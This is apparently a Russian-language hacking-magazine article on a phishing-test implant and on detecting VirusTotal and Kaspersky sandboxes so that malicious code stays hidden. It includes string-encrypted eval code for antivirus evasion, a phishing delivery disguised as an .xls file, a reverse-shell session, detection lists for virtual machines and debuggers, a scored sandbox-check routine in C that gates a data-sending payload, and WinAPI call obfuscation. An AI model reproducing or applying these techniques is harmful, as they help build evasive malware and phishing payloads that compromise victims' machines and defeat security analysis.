которая будет отправляться поль зователю.
  Для получения исполняемого фай ла я использовал связку Python +
PyInstaller. Идея сос тояла в том, чтобы собрать минимум информации о хосте
и понять, кому из сот рудни ков он принадлежит. Основной информацией стал
IP-адрес машины в локаль ной сети пред при ятия, пос кольку он никогда
не меня ется и по нему можно выяс нить, кто же все-таки запустил «вре донос».




                        Статья написа на в иссле дователь ских целях, име -
                         ет озна коми тельный характер и предназначена
                       для  спе циалистов  по  безопас ности.  Автор
                      и редакция не несут ответствен ности за любой
                        вред, при чинен ный с при мене нием изложенной
                    информации.  Использование  или  рас простра -
                      нение ПО без лицензии производите ля может
                      преследоваться по закону.


При мер информации, которая пос тупала на мой сервер, если кто-то запускал
исполня емый файл:



  Hostname: <hostname>
  Version: <version_os>
  Release: <number_release>
  Architecture: <architecture>
  Type machine: <type>
  Network name: <network_name>
  User: <run_user>
  OS type: <windows/linux>
  Local_ip: <local_ip>


На машинах орга низа ции, которую мы тестировали, сто ит антивирусное
решение от компании Kaspersky — Kaspersky Endpoint Security. Для его обхо -
да я исполь зовал возможность Python выполнять код, который передается
в виде строки. Приведу при мер.
   Вот исходный код на Python для получения OS type :


os_type = platform.system()

А так выг лядит обфусци рованный код:


command_crypt = b'k\xb0\x0fp4\x03\xe9D\xe0\x01\xd5Z}\xc1\x85\xa42\xc5
6\x9f\xc0\x81\xaf\t\xe5\x08k!\x81\xd5\xcc\xf0'
command_decrypt = func_decrypt(command_crypt, key_decrypt)
os_type = eval(command_decrypt)

Ре али зация нес ложная. Сначала мы шифруем все строки кода с исполь -
зовани ем функции шифрования, затем используем их в итоговом файле,
из которого будет получен исполняемый файл. В нем содержится код с такой
структурой:
 1. За шиф рованная строка кода.
 2. Дешифровка зашиф рованной стро ки кода.
 3. Ее выполнение.

По лученный исполня емый файл я поместил на сер вер. В зависимости
от передан ного в запросе User-Agent скрипт передавался под нужную ОС.
Когда пользователь переходил по фишинговой ссылке, ему отправ лялся
архив, замас кирован ный под файл .xls, пос ле чего выполнялся редирект
на реальный сайт компании, чтобы было менее подозрительно.
   Так вот, еще до того, как я выгрузил файл на сер вер, я уже начал получать
отсту ки от непонят ных для меня хостов. Вот пример одного из таких:



  Hostname: DESKTOP-HESL6H8
   Version: 10.0.18362
   Release: 10
   Architecture: ('64bit', 'WindowsPE')
   Type machine: AMD64
   Network name: DESKTOP-HESL6H8
   User: G58gQ
   OS type: Windows
   Local_ip: 10.16.202.175


Сразу бросается в гла за стран ное имя поль зовате ля, как будто бы сге нери -
рованное. Единственная «утечка» мог ла произойти с машины, на которой я
тес тировал обход анти вируса Kaspersky. Тог да я не стал обра щать внимания
на это, пос коль ку антивирус все рав но не ругался на мой файл. И я благопо -
лучно забил на этот факт до недавнего времени, пока не заин тересовался
обходом песочниц.


ÈÄÅß ÏÎ ÑÁÎÐÓ ÈÍÔÎÐÌÀÖÈÈ Î ÏÅÑÎ×ÍÈÖÀÕ

Предположи тельно тогда я получал отстуки из песоч ниц Kaspersky, которые
анализировали файл с неизвестной сиг натурой. Поэтому я решил: раз при -
ходят зап росы, зна чит, у песоч ниц есть дос туп в интернет и он не блокиру -
ется. Если усовершенствовать скрипт с reverse shell, чтобы не ловиться прос -
то по сиг натуре, можно попробовать полазить по такой песочнице. Основу
для реализации этой идеи я взял с сайта revshells.com .
  Для экспериментов использовалась машина с белым IP. Я скомпилировал
файл, и антивирус после пары под ключений его нейтрализовал. А я стал
ждать. И... ничего, я так и не получил кон некта.
  Но при загрузке прог раммы на VirusTotal вир туальные сре ды все-таки поз -
воляют взаимо дей ствовать с хос том пос ле подключения:



  root@hostname:~# nc -lvnp 8080
  Listening on 0.0.0.0 8080


  Connection received on 34.86.36.138 49171
  Windows PowerShell
  Copyright (C) 2016 Microsoft Corporation. All rights reserved.


  PS C:\Users\azure\Downloads>
  PS C:\Users\azure\Downloads> dir
  dir
  PS C:\Users\azure\Downloads> cd ..
  cd ..
  PS C:\Users\azure> dir
  dir


  Directory: C:\Users\azure


  Mode                LastWriteTime         Length Name
  ----                -------------         ------ ----
  d-----        3/31/2022   5:04 AM                .idlerc
  d-----         1/6/2023  10:44 AM                .ms-ad
  d-r---        3/25/2022   4:09 PM                Contacts
  d-r---        3/25/2022   6:25 PM                Desktop
  d-r---        3/25/2022   4:09 PM                Documents
  d-r---         5/5/2025   8:45 AM                Downloads
  d-r---        3/25/2022   4:09 PM                Favorites
  d-r---        3/25/2022   4:09 PM                Links
  d-r---        3/25/2022   4:09 PM                Music
  d-r---        3/25/2022   4:09 PM                Pictures
  d-r---        3/25/2022   4:09 PM                Saved Games
  d-r---        3/25/2022   4:09 PM                Searches
  d-r---        3/25/2022   4:09 PM                Videos


  PS C:\Users\azure> Get-Process
  Get-Process


  Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
  -------  ------    -----      -----     ------     --  -- -----------
  115       9    15448      15812       0.64    932   0 audiodg
  31       5     1080       3348       0.02   2168   1 conhost
  35       5     1140       3748       0.02   2444   1 conhost
  31       5     1080       3344       0.00   2460   1 conhost
  31       5     1076       3348       0.03   2560   1 conhost
  31       5     1076       3344       0.02   2648   1 conhost
  31       5     1076       3344       0.00   2668   1 conhost
  31       5     1080       3312       0.02   2788   1 conhost
  31       5     1080       3316       0.00   2812   1 conhost
  434      11     1840       4080       0.86    328   0 csrss
  325      15     2876       5900       1.19    384   1 csrss


  ...


  79       7     1416       5280       0.06   2056   0 unsecapp
  81      10     1460       4728       0.64    376   0 wininit
  112       9     2692       7520       1.77    424   1 winlogon
  182      11     3532       9852       0.13    584   0 WmiPrvSE
  124       9     2280       6820       0.05   1836   0 WmiPrvSE
  133       9     2464       7236       0.14   2744   0 WmiPrvSE
  439      32     9896      27188       0.83   2484   0 wmpnetwk


  PS C:\Users\azure> exit


В ито ге я решил использовать тактику, как при проведе нии фишин говой ата -
ки, а имен но — использовать скрипт для сбора информации о системе
и отправки дан ных на сервер.
  Понятно, что тех данных, которые я собирал в изначаль ном скрип те, явно
малова то, поэтому я усовершенствовал прог рамму, и теперь она собирает
следующие параметры:


OS type:
Version:
Release:
Architecture:
Type machine:
Network name:
User:
Hostname:
Local ip:
System Date:
   System boot time:
   Uptime:
System hardware:
System File:
   Directory: C:/Windows:
   Directory: C:/Program Files:
   Directory: C:/Program Files (x86):
   Directory: C:/ProgramData:
   Directory: C:/Windows/System32:
   Directory: C:/Windows/SysWOW64:
   Directory: C:/Windows/Temp:
   Directory: C:/Users:
User File:
   User directory:
   Directory: Downloads:
   Directory: Desktop:
   Directory: Pictures:
   Directory: Videos:
   Directory: Music:
   Directory: AppData\Local\Temp:
Process Data:

Также я собирал информацию о системе c помощью команд PowerShell,
исполь зуя модуль subprocess:


systeminfo
ipconfig /all
net user
Get-WmiObject Win32_ComputerSystem
Get-Service
Get-WmiObject Win32_VideoController
Get-CimInstance Win32_LogicalDisk -Filter "DriveType=3" | Select-
Object `DeviceID, @{Name="Size(GB)";Expression={"{0:N2}" -f ($_.Size
/ 1GB)}}, @{Name="Free(GB)";Expression={"{0:N2}" -f ($_.FreeSpace / 1
GB)}},@{Name="Used(GB)";Expression={"{0:N2}" -f (($_.Size - $_.
FreeSpace) / 1GB)}}




                    Пока скрипты крутились в дро билках песочниц, я
                      поискал в интернете информа цию об обходе этих
                     самых песочниц. В ито ге мне понравились эти
                          статьи:
                    •Детектим виртуалки
                    •Детект песоч ницы. Учим ся определять, работа -
                           ет ли приложение в sandbox-изо ляции
                      •Как песок сквозь паль цы: могут ли вредоно сы
                       обойти Sandbox и как они это делают

                   Многие идеи я буду брать из этих статей, так что
                    мой код по боль шей час ти не уникален.



ÀÍÀËÈÇ ÏÎËÓ×ÅÍÍÎÉ ÈÍÔÎÐÌÀÖÈÈ

Ниже приведена таб лица с данными, по которой мы будем в первую очередь
определять сре ду.


  Environ   Hostna   OS      CPU        Total      Uptime    Process
 ment    me        Version    count    memory   (day      count

                                                 hh.mm.

                                                            ss)

  Real PC              10        4         32        1 day      192

                                                           02:16:12

  Real PC              10        6         16         13:51:48   275

  VirTotal    WIN-      10        1         1           0:01:04    56

          5E07CO

          S9ALR

  VirTotal    WIN-      7         1         8           0:01:41    60
          QIUREV

           VK5FL

  VirTotal    715575    10        4         8           2:06:38    189

  VirTotal    061544    10        2         8           2:03:42    161

  VirTotal    424505    10        4         8           1:46:43    167

  VirTotal     azure-     7         2         2           0:03:57    58
          PC

  VirTotal     azure-     7         2         2           0:04:11    55

          PC

  VirTotal    WALKE    7         2           1.5         0:01:25    54

           R-PC

  VirTotal    00900B    10        2         2           0:50:12    52
           C83803

  VirTotal   COMPU   10        2         4           0:08:47    103

            TER-

          9GV0UZ

  VirTotal    MZLTRR   10        1         2           2:41:42    51
            8480508

            84

Бро сает ся в гла за, что у некоторых хос тов явно проб лемы с CPU и MEM. Так -
же мы видим, что некоторые машины край не недолго находятся в Uptime, а у
других слишком мало запущенных процессов. Все это косвенно может сви -
детель ствовать о виртуали зации. Данных от песоч ниц Kaspersky я не получил:
анти вирус ни в какую не хотел считать мой файл зловредным.
  В итоге я решил проверить свою программу с помощью динамичес кого
анализа на их сайте opentip.kaspersky.com . И как ока залось, исполняемый
файл, полученный с использованием связ ки Python 3.12 + PyInstaller, просто
не может запус титься в их песоч нице.





И даже с учетом того, что файл содер жит reverse shell, анализ показы вает, что
файл безопа сен.





В общем, я вернулся на Python 3.7 и попробовал писать код на нем. Теперь
программа ана лизи рова лась нор маль но. Вот данные, которые я получил.


  Environ   Hostna   OS      CPU        Total      Uptime    Process
 ment    me        Version    count    memory   (day      count

                                                 hh.mm.

                                                            ss)

  Real PC              10        4         32        1 day      192
                                                           02:16:12

  Real PC              10        6         16         13:51:48   275

 Kas       ELZ-      10        2         4           0:08:16    100

          8K4JW2

          UL3QY

 Kas        art-PC     7         2         1           0:04:15    44

Но получить с хос тов данные, похожие на те, что приходили при проведе нии
тес товой фишинговой ата ки, мне не удалось. И только когда я оставил одни
команды PowerShell, мне наконец при летели отсту кивания, которые были схо -
жи, по крайней мере hostname и username напоминали те, что я увидел в пер -
вый раз. К сожале нию, команда Get-Process почему-то не отработала,
и информа ции о количес тве запущенных процессов мне получить не удалось.


 Host      Hostna   OS      CPU        Total      Uptime    Process

         me        Version    count    memory   (day      count

                                                 hh.mm.

                                                            ss)

  Real PC                        4         32        1 day      192

                                                           02:16:12

  Real PC                        6         16         13:51:48   275

 Kas      DESKTO   10        1         2           1:35:42     ?

              P-
           09L7V90

 Kas      DESKTO   10        1         2           2:38:52     ?

              P-

          NL2CM8
       W

 Kas      DESKTO   10        1         2           3:44:45     ?

              P-

          WSP0LA

          K

Как видно, эти хос ты тоже страдают от нехватки CPU и MEM.
   Теперь копаем глуб же: нам нужны MAC-адреса. По ним также можно
понять, что прог рамма запуще на в виртуаль ной среде. На этом ловятся хос ты
WIN-\* . Вот MAC-адреса, которые будем искать:


{{0x00, 0x50, 0x56}, "VMware ESX 3, Server, Workstation, Player"},
{{0x00, 0x0C, 0x29}, "VMware ESX 3, Server, Workstation, Player"},
{{0x00, 0x05, 0x69}, "VMware ESX 3, Server, Workstation, Player"},
{{0x00, 0x1с, 0x14}, "VMware ESX 3, Server, Workstation, Player"},


{{0x00, 0x03, 0xff}, "Microsoft Hyper-V, Virtual Server, Virtual PC"}
,
{{0x00, 0x0d, 0x3a}, "Microsoft Hyper-V, Virtual Server, Virtual PC"}
,
{{0x00, 0x50, 0xf2}, "Microsoft Hyper-V, Virtual Server, Virtual PC"}
,
{{0x7c, 0x1e, 0x52}, "Microsoft Hyper-V, Virtual Server, Virtual PC"}
,
{{0x00, 0x12, 0x5a}, "Microsoft Hyper-V, Virtual Server, Virtual PC"}
,
{{0x00, 0x15, 0x5d}, "Microsoft Hyper-V, Virtual Server, Virtual PC"}
,
{{0x00, 0x17, 0xfa}, "Microsoft Hyper-V, Virtual Server, Virtual PC"}
,
{{0x28, 0x18, 0x78}, "Microsoft Hyper-V, Virtual Server, Virtual PC"}
,
{{0x7c, 0xed, 0x8d}, "Microsoft Hyper-V, Virtual Server, Virtual PC"}
,
{{0x00, 0x1d, 0xd8}, "Microsoft Hyper-V, Virtual Server, Virtual PC"}
,
{{0x00, 0x22, 0x48}, "Microsoft Hyper-V, Virtual Server, Virtual PC"}
,
{{0x00, 0x25, 0xae}, "Microsoft Hyper-V, Virtual Server, Virtual PC"}
,
{{0x60, 0x45, 0xbd}, "Microsoft Hyper-V, Virtual Server, Virtual PC"}
,
{{0xdc, 0xb4, 0xc4}, "Microsoft Hyper-V, Virtual Server, Virtual PC"}
,


{{0x00, 0x1c, 0x42}, "Parallels Desktop, Workstation, Server,
Virtuozzo"},
{{0x00, 0x0f, 0x4b}, "Virtual Iron 4"},
{{0x00, 0x16, 0x3e}, "Red Hat Xen | Oracle VM | XenSource | Novell
Xen"},
{{0x08, 0x00, 0x27}, "Sun xVM VirtualBox"},




                                     Продолжение статьи →
ВЗЛОМ                         НАЧАЛО СТАТЬИ



               ДЕТЕКТИМ СЭНДБОКСЫ
          VIRUSTOTAL И KASPERSKY, ЧТОБЫ
          СПРЯТАТЬ ВРЕДОНОСНЫЙ КОД




А вот процес сы, по которым можно понять, что скрипт запущен в виртуаль ной
среде или ана лизируется в дебаг гере:


// Иконка VirtualBox в трее гостевой ОС
TEXT("VBoxTray.exe"),


// Служба VirtualBox Guest Additions
TEXT("VBoxService.exe"),
TEXT("vboxservice.exe"),


// Драйвер VirtualBox Guest
TEXT("vboxguest.sys"),


// VMware Tools
TEXT("vmtoolsd.exe"),
TEXT("vmwaretray.exe"),
TEXT("vmwareuser.exe"),
TEXT("vmsrvc.exe"),
TEXT("vmhgfs.sys"),
TEXT("vmware-vmx.exe"),
TEXT("vmware-authd.exe"),


// Hyper-V
TEXT("vmicvss.exe"),
// TEXT("vmms.exe"),  // Был обнаружен в реальной машине,
закомментировано
TEXT("vmmem.exe"),
TEXT("vmwp.exe"),


// QEMU
TEXT("qemu-system-x86_64.exe"),
TEXT("qemu-vm-guest.exe"),


// Parallels
TEXT("prl_vm_app.exe"),
TEXT("prl_tools.exe"),
TEXT("prl_cc.exe"),
TEXT("SharedIntApp.exe"),


// Драйвер мыши виртуальной машины
TEXT("vmmouse.sys"),


// Xen Virtualization environment
TEXT("xenservice.exe"),


// Windows Sandbox
TEXT("WindowsSandbox.exe"),


// Sandboxie
TEXT("SandboxieRpcSs.exe"),
TEXT("SandboxieDcomLaunch.exe"),
TEXT("SbieSvc.exe"),
TEXT("SbieCtrl.exe"),


// Comodo Sandbox
TEXT("SxIn.exe"),


// Process Monitor — анализ поведения
TEXT("procmon.exe"),


// Обнаружен в процессах одной из песочниц VirusTotal
TEXT("VmRemoteGuest.exe"),


// Windows Debugging Tools
TEXT("ntsd.exe"),
TEXT("windbg.exe"),


// IDA Pro
TEXT("idaq.exe"),
TEXT("idag.exe"),


// x64dbg/x32dbg
TEXT("x64dbg.exe"),
TEXT("x32dbg.exe"),

И тут меня заин тересовал вывод команды


Get-WmiObject Win32_VideoController

А имен но вот такие строки:


Name
Description
PNPDeviceID

Со бираю информацию с хостов:


Real PC:


Description                  : AMD Radeon(TM) Vega 10 Graphics
PNPDeviceID                  : PCI\VEN_1002&DEV_15DD&SUBSYS_512217AA&
REV_D0\4&35FEB52A&0&0041


Description                  : Intel(R) UHD Graphics 730
PNPDeviceID                  : PCI\VEN_8086&DEV_4692&SUBSYS_D0001458&
REV_0C\3&11583659&0&10



Kaspersky:


С сайта анализатора:


Hostname: ELZ-8K4JW2UL3QY
OS: Windows 10
Name                         : Microsoft Basic Display Adapter
Description                  : Microsoft Basic Display Adapter
PNPDeviceID                  : PCI\VEN_1AE0&DEV_A001&SUBSYS_00011AE0&
REV_01\3&13C0B0C5&0&18


Hostname: art-PC
OS: Windows 7
Name                         : Standard VGA Graphics Adapter
Description                  : Standard VGA Graphics Adapter
PNPDeviceID                  : PCI\VEN_1234&DEV_1111&SUBSYS_11001AF4&
REV_02\3&1


Файлы, аналогичные файлам при проведении тестового фишинга:


Hostname: DESKTOP-09L7V90
OS: Windows 10
Name                         : Microsoft Basic Display Adapter
Description                  : Microsoft Basic Display Adapter
PNPDeviceID                  : PCI\VEN_1234&DEV_1111&SUBSYS_11001AF4&
REV_00\3&13C0B0C5&0&10


Hostname: DESKTOP-NL2CM8W
OS: Windows 10
Name                         : Microsoft Basic Display Adapter
Description                  : Microsoft Basic Display Adapter
PNPDeviceID                  : PCI\VEN_1234&DEV_1111&SUBSYS_11001AF4&
REV_00\3&13C0B0C5&0&10


Hostname: DESKTOP-WSP0LAK
OS: Windows 10
Name                         : Microsoft Basic Display Adapter
Description                  : Microsoft Basic Display Adapter
PNPDeviceID                  : PCI\VEN_1234&DEV_1111&SUBSYS_11001AF4&
REV_00\3&13C0B0C5&0&10



VirusTotal:


Hostname: WIN-5E07COS9ALR
OS: Windows 10
Name                         : Microsoft Hyper-V Video
Description                  : Microsoft Hyper-V Video
PNPDeviceID                  : VMBUS\{DA0A7802-E377-4AAC-8E77-
0558EB1073F8}\{5620E0C7-8062-4DCE-AEB7-520C7EF76171}


Hostname: WIN-QIUREVVK5FL
OS: Windows 7
Name                         : Microsoft Hyper-V Video
Caption                      : Microsoft Hyper-V Video
PNPDeviceID                  : VMBUS\{DA0A7802-E377-4AAC-8E77-
0558EB1073F8}\{5620E0C7-8062-4DCE-AEB7-520C7EF76171}


Hostname: 715575
OS: Windows 10
Name                         : AD59MKMM
Description                  : CMPMV5
PNPDeviceID                  : PCI\VEN_15AD&DEV_0405&SUBSYS_040515AD&
REV_00\3&61AAA01&0&78


Hostname: 061544
OS: Windows 10
Данные отсутствуют (команда не выполнилась)


Hostname: 424505
OS: Windows 10
Name                         : X9387726
Description                  : AE27H7US
NPDeviceID                  : PCI\VEN_15AD&DEV_0405&SUBSYS_040515AD&
REV_00\3&61AAA01&0&78


Hostname: azure-PC
OS: Windows 7
Name                         : Standard VGA Graphics Adapter
Description                  : Standard VGA Graphics Adapter
PNPDeviceID                  : PCI\VEN_1B36&DEV_0100&SUBSYS_11001AF4&
REV_05\3&2


Hostname: azure-PC
OS: Windows 7
Name                         : Standard VGA Graphics Adapter
Description                  : Standard VGA Graphics Adapter
PNPDeviceID                  : PCI\VEN_1B36&DEV_0100&SUBSYS_11001AF4&
REV_05\3&2


Hostname: 00900BC83803
OS: Windows 10
Name                         : Intel(R) UHD Graphics 630
Description                  : Microsoft Basic Display Adapter
PNPDeviceID                  : PCI\VEN_1234&DEV_5678&SUBSYS_9101112&
REV_01\3&ABCDE&0&11


Hostname: COMPUTER-9GV0UZ
OS: Windows 10
Name                         : Microsoft Basic Display Adapter
Description                  : Microsoft Basic Display Adapter
PNPDeviceID                  : PCI\VEN_1AE0&DEV_A001&SUBSYS_00011AE0&
REV_01\3&13C0B0C5&0&18


Hostname: MZLTRR848050884
OS: Windows 10
Name                        : Microsoft Basic Display Adapter
Description                 : Microsoft Basic Display Adapter
PNPDeviceID                 : PCI\VEN_8086&DEV_0412&SUBSYS_2AF7103C&
REV_06\3&21436425&0&10

Как видно, есть пов торяющиеся зна чения, а также имена и описания, похожие
на дефолтные или сгенерированные. Дополнительно к выводу о том, что
при  проведении  тес тирова ния  по  фишингу  мне  прилета ли  отстуки
от Kaspersky, говорят оди наковые VEN и DEV, полученные с сай та анализатора
и откуда-то еще (отку да при летают стран ные отстукивания со стран ных хос -
тов, я так и не понял).
  В итоге я получил следующие имена вир туальных адаптеров:


  // Имена виртуальных видеоадаптеров
  char* virtual_keywords[] = {
    "Microsoft Basic Display Adapter",
    "VMware SVGA 3D",
    "VirtualBox Graphics Adapter",
    "Hyper-V Video",
    "Parallels Display Adapter (WDDM)",
    "QXL",
    "Red Hat QXL"
    "Xen VGA",
    "Citrix Display Adapter",
    "GDI Generic",
    "VBOX DISP Adapter"

Параметр PNPDeviceID указывает идентификатор логического устройства
Win32 Plug and Play. Затем я попытался найти инфу о том, какие идентифика -
торы используют ся в вир туаль ных средах для виде окарт:


// Виртуальные VEN- и DEV-коды
char* virtual_code[] = {
    //  Vendor ID    Device ID


    // VMware
    "VEN_15AD", "DEV_0405",


    // VirtualBox
    "VEN_80EE", "DEV_BEEF", "DEV_CAFE",


    // Microsoft Hyper-V
    "VEN_\x0fDESKTOP-VVJHHG1414", "DEV_5353",


    // QEMU / KVM
    "VEN_1AF4", "DEV_1110",


    // Parallels Display Adapter
    "VEN_1AB8", "DEV_4000", "DEV_4005",


    // Citrix Xen
    "VEN_5853", "DEV_0001", "DEV_0002", "DEV_0003", "DEV_0004",
    "DEV_0005", "DEV_0006", "DEV_0007", "DEV_0008", "DEV_0009",
    "DEV_000A", "DEV_000B", "DEV_000C", "DEV_000D", "DEV_000V",
"DEV_000F",


    // Bochs / QEMU Generic VGA
    "VEN_1234", "DEV_1111",


    // Red Hat / QEMU
    "VEN_1B36", "DEV_0100",


    // Google
    "VEN_1AE0", "DEV_A001"
};

По ним мы будем опре делять наличие вир туальной среды. Теперь взглянем
на дис ки.


Real PC:


OS: Windows 10
DeviceID Size(GB) Free(GB) Used(GB)
-------- -------- -------- --------
C:       465,12   66,92    398,20


Kaspersky:


С сайта анализатора:


Hostname: ELZ-8K4JW2UL3QY
OS: Windows 10
DeviceID Size(GB) Free(GB) Used(GB)
-------- -------- -------- --------
C:       39.89    20.55    19.34


Hostname: art-PC
OS: Windows 7
DeviceID Size(GB) Free(GB) Used(GB)
-------- -------- -------- --------
C:       18.90    2.49     16.41
D:       1.00     0.87     0.13


Файлы, аналогичные файлам при проведении тестового фишинга:


Hostname: DESKTOP-09L7V90
OS: Windows 10
DeviceID Size(GB) Free(GB) Used(GB)
-------- -------- -------- --------
C:       1,023.51 1,001.54 21.97


Hostname: DESKTOP-NL2CM8W
OS: Windows 10
DeviceID Size(GB) Free(GB) Used(GB)
-------- -------- -------- --------
C:       1,023.51 1,001.54 21.97


Hostname: DESKTOP-WSP0LAK
OS: Windows 10
DeviceID Size(GB) Free(GB) Used(GB)
-------- -------- -------- --------
C:       299.51   276.81   22.70



VirusTotal:


Hostname: WIN-5E07COS9ALR
OS: Windows 10
DeviceID Size(GB) Free(GB) Used(GB)
-------- -------- -------- --------
C:       40.00    25.68    14.32
D:       64.00    63.87    0.13


Hostname: WIN-QIUREVVK5FL
OS: Windows 7
Данные почему-то отсутствуют.


Hostname: 715575
OS: Windows 10
DeviceID Size(GB) Free(GB) Used(GB)
-------- -------- -------- --------
C:       208.15   104.83   103.32


Hostname: 061544
OS: Windows 10
DeviceID Size(GB) Free(GB) Used(GB)
-------- -------- -------- --------
C:       208.15   55.46    152.69


Hostname: 424505
OS: Windows 10
DeviceID Size(GB) Free(GB) Used(GB)
-------- -------- -------- --------
C:       208.15   104.83   103.32


Hostname: azure-PC
OS: Windows 7
DeviceID Size(GB) Free(GB) Used(GB)
-------- -------- -------- --------
C:       119.90   89.61    30.29


Hostname: azure-PC
OS: Windows 7
DeviceID Size(GB) Free(GB) Used(GB)
-------- -------- -------- --------
C:       119.90   89.61    30.30


Hostname: 00900BC83803
OS: Windows 10
DeviceID Size(GB) Free(GB) Used(GB)
-------- -------- -------- --------
C:       29.45    9.32     20.14
E:       0.29     0.26     0.03
F:       1,024.00 1,023.86 0.13


Hostname: 00900BC83803
OS: Windows 10
DeviceID Size(GB) Free(GB) Used(GB)
-------- -------- -------- --------
C:       39.89    20.55    19.33


Hostname: MZLTRR848050884
OS: Windows 10
DeviceID Size(GB) Free(GB) Used(GB)
-------- -------- -------- --------
C:       999.90   981.98   17.92
G:       999.90   981.98   17.92

Как видно, встречаются лишь маленькие и часто повторяющиеся значения.


ÐÅÀËÈÇÀÖÈß

Так как не все данные на сто процентов говорят о том, что программа
запущена в виртуальной среде, я решил использовать методику из прак -
тичес кого  экзамена  в ГИБДД.  Экзамен продолжает ся,  пока  кан дидат
в водите ли либо не сдаст экза мен, либо не наберет семь штраф ных бал лов.
Так вот, за раз ные нарушения начис ляется опре делен ное количество баллов.
Есть нарушения, после которых экзамен завершается сра зу (например,
нарушение при повороте, развороте, пре вышение ведет к получе нию сразу
семи баллов), а есть те, за которые кандидат может получить от одного
до четырех баллов (скажем, забыл включить поворотник или заглох).
  В нашем случае тоже есть параметры, по которым наверняка мож но опре -
делить, что прог рамма запущена в виртуальной сре де: виртуальный виде -
оадаптер, игно рирование функций sleep , процессы, относящиеся к вир -
туали зации. А есть те, по которым можно сделать косвенные выводы, нап -
ример количес тво ядер про цессора или чис ло запущенных процессов.
Думаю, логика понятна.
   Теперь составим таб лицу с оценочными тес тами.


 Method

 Check Sleep                 Positive                   Negative

  Points                   0                      7



 Method

 Check Uptime      <=10 min         <=30 min         <=1 hour

  Points             7                 4                 1



 Method

 Check CPU       <=1             <=2             <=4

  Points             7                 4                 1



 Method

 Check MEM       <=2             <=4             <=6

  Points             7                 4                 1



 Method

 Check MAC                  Positive                   Negative

  Points                   0                      4



 Method

 Check Process     <=100           <=150           <=170

  Points             7                 4                 1

                         Positive             Negative

  Points             0                 7



 Method

 Check Video                 Positive                   Negative

  Points                   0                      7



 Method

 Check Disk            < 100 GB

  Points                   7



 Method

 Check Mouse                Positive                   Negative

  Points                   0                      7

Полный код я выложил на GitHub . Основой программы будет невидимое окно.
Идею я взял из видео «Окно-невидим ка» с канала First Steps.
   Вот часть кода, где соз дается окно и вызывается фун кция проверки:


case WM_CREATE:
        {
            check_box();
            int a;
            for(;;) {
                // Инициализация генератора случайных чисел текущим
временем
                srand(time(NULL));
                // Генерация числа от 1 до 100
                int random_number = (rand() % 100) + 1;
                a += random_number;
            }
        }




                                     Продолжение статьи →
ВЗЛОМ                         НАЧАЛО СТАТЬИ



               ДЕТЕКТИМ СЭНДБОКСЫ
          VIRUSTOTAL И KASPERSKY, ЧТОБЫ
          СПРЯТАТЬ ВРЕДОНОСНЫЙ КОД




Если про верка прошла успешно и мы не в вир туальной машине, фун кция
check_box завершит работу программы после отра ботки полез ной нагрузки.
В противном случае программа перейдет к бес конечному сложению чисел.
Вот функция check_box:


int check_box()
{
    int check_result = 0;
    int local_result = 0;


    local_result = 0;
    local_result = Check_Sleep();
    check_result = check_result + local_result;
    if(check_result >= 7) return 1;


    local_result = 0;
    local_result = Check_Uptime();
    check_result = check_result + local_result;
    if(check_result >= 7) return 1;


    local_result = 0;
    local_result = Check_CPU_Info();
    check_result = check_result + local_result;
    if(check_result >= 7) return 1;


    local_result = 0;
    local_result = Check_MEM_Info();
    check_result = check_result + local_result;
    if(check_result >= 7) return 1;


    local_result = 0;
    local_result = Check_MAC();
    check_result = check_result + local_result;
    if(check_result >= 7) return 1;


    local_result = 0;
    local_result = Check_Process();
    check_result = check_result + local_result;
    if(check_result >= 7) return 1;


    local_result = 0;
    local_result = Check_First_Video_Device();
    check_result = check_result + local_result;
    if(check_result >= 7) return 1;


    local_result = 0;
    local_result = Check_Disk_Info();
    check_result = check_result + local_result;
    if(check_result >= 7) return 1;


    local_result = 0;
    local_result = Check_Mouse_Motion();


    check_result = check_result + local_result;
    if(check_result >= 7) return 1;
    Tapping();


    exit(0);
}

В этой час ти кода пос ледова тельно выпол няются провер ки, и если набира -
ется семь или боль ше баллов, то функция возвращает 1 и код переходит
к бесконечному скла дыва нию чисел. Если же провер ки не обнаружили вир -
туальную сре ду, то прог рамма переходит к фун кции Tapping (аналог полез -
ной наг рузки), которая получа ет Hostname сис темы и отправляет его POST-
зап росом мне на сервер, что бы я мог определить, в какой виртуальной сре де
по тем или иным при чинам отра бота ла полез ная нагрузка.
  На сервере я дол жен получить при мерно такую картину:



  id: Tapping
  ('user_ip', <ip>)
  ('user_agent', <user_agent>)
  ('date', 'yyyy-mm-dd hh:mm:ss')
  ('Width', <width>)
  ('Longitude', <Longitude>)
  ('hostname', <hostname>)
  status code: 0



ÎÁÔÓÑÊÀÖÈß

Первое, что я решил сделать, — это обфусци ровать функции Win32 API. Идею
я позаимс твовал из статьи « Кривая дорожка. Обфусцируем вызовы WinAPI
новыми способами ».
   Вот пример для функции GetSystemInfo . Если скомпилировать проект
без обфуска ции, то можно уви деть сле дующее:


strings main.exe | grep GetSystemInfo
GetSystemInfo
ProxyGetSystemInfo
GetSystemInfo
__imp_GetSystemInfo

А теперь обфусцируем ее выб ранным нами способом:


void ProxyGetSystemInfo(LPSYSTEM_INFO lpSystemInfo) {
    // Создаем тип pGetSystemInfo, который представляет указатель на
функцию,
    // принимающую указатель на SYSTEM_INFO и не возвращающую
значение.
    // Это позволит динамически загружать функцию GetSystemInfo
    typedef void(WINAPI* pGetSystemInfo)(LPSYSTEM_INFO);


    // Имя функции "GetSystemInfo"
    char funcName[] = { 'G','e','t','S','y','s','t','e','m','I','n',
'f','o','\0' };


    // Имя библиотеки "kernel32.dll"
    char name_dll[] = { 'k','e','r','n','e','l','3','2','.','d','l',
'l','\0' };


    // Загружаем дескриптор библиотеки kernel32.dll, которая
содержит GetSystemInfo
    HMODULE hKernel32 = LoadLibraryA(name_dll);


    // Получаем адрес функции GetSystemInfo в этой библиотеке
    pGetSystemInfo GetSystemInfoFunc = (pGetSystemInfo)GetProcAddress
(hKernel32, funcName);


    // Если функция загружена, вызываем ее
    if (GetSystemInfoFunc != NULL) {
        // Вызов функции GetSystemInfo
        GetSystemInfoFunc(lpSystemInfo);
    } else {
        // printf("Error: GetSystemInfo function not found!\n");
        exit(1);
    }


    // Освобождаем загруженную библиотеку
    FreeLibrary(hKernel32);
}

Теперь компилируем проект и смотрим, осталось ли упоминание о нашей
функции в скомпилированном файле:


strings main.exe | grep GetSystemInfo
ProxyGetSystemInfo

Как вид но, осталось только изме ненное наиме нование фун кции, далее мы
его тоже заменим, но будем делать это в авто матическом режиме с помощью
скрипта на Python.
   Проксиру ем таким образом все функции, которые используем в проекте.
